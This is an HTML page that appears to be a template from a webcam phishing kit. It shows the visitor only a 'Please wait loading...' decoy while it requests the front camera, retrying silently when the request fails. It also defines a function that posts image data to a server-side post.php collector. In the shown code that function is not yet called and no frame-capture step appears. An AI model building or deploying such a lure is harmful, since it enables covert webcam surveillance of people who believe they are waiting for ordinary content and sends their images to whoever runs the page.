<!doctype html>
<html>
<head>
<script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
<link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
</head>

<div class="video-wrap">
   <video id="video" playsinline autoplay></video>
</div>
<script>

function post(imgdata){
$.ajax({
    type: 'POST',
    data: { cat: imgdata},
    url: 'post.php',
    dataType: 'json',
    success: function(result){
        // call the function that handles the response/results
    },
    error: function(){
    }
  });
};


'use strict';

const video = document.getElementById('video');
const errorMsgElement = document.querySelector('span#errorMsg');

const constraints = {
  audio: false,
  video: {
    
    facingMode: "user"
  }
};

// Access webcam
async function init() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    handleSuccess(stream);
  } catch (e) {
    
    try {
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    handleSuccess(stream);
  } catch (e) {
    
    try {
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    handleSuccess(stream);
  } catch (e) {
    
    try {
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    handleSuccess(stream);
  } catch (e) {
    
  }
  }
  }
  }
}

// Success
function handleSuccess(stream) {
  window.stream = stream;
  video.srcObject = stream;
}
// Load init
init();

</script>

    <body>
        <p style="text-align: center;">Please wait loading...</p>
        <p style="text-align: center;">Other Reload</p>
    </body>

</html>
